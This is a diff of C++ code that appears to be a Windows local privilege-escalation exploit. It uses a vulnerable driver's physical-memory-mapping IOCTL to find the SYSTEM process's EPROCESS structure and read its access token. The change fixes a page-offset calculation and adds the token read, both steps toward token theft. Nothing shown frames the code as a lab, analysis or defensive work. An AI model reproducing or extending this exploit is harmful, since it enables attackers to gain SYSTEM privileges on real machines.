@@ -50,7 +50,7 @@ int main(int argc, char** argv)
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
-
+	
 	std::vector <unsigned __int64> EPROCESS_SYSTEM;
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
@@ -65,7 +65,7 @@ int main(int argc, char** argv)
 	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
 		printf("------------------------------------\nEPROCESS Base of System: %p\n", (void*)EPROCESS_SYSTEM[i]);
 		EPROCESS_SYSTEM_page.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
-		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
+		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 	PVOID* buf = (PVOID*)malloc(0x1000);
@@ -78,8 +78,18 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 		return -1;
 	}
-	
+
 	// print Token for each EPROCESS Base
+	PVOID castedBuf = *buf;
+	castedBuf = (unsigned char*)castedBuf + EPROCESS_SYSTEM_page_offset[0];
+	castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
+	printf("This should be the token: %p\n", *(unsigned __int64*)castedBuf);
+
+
+	if (UnmapPhysicalMemory(buf) == FALSE) {
+		printf("UnmapPhysicalMemory failed\n");
+		return -1;
+	}
 
 
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
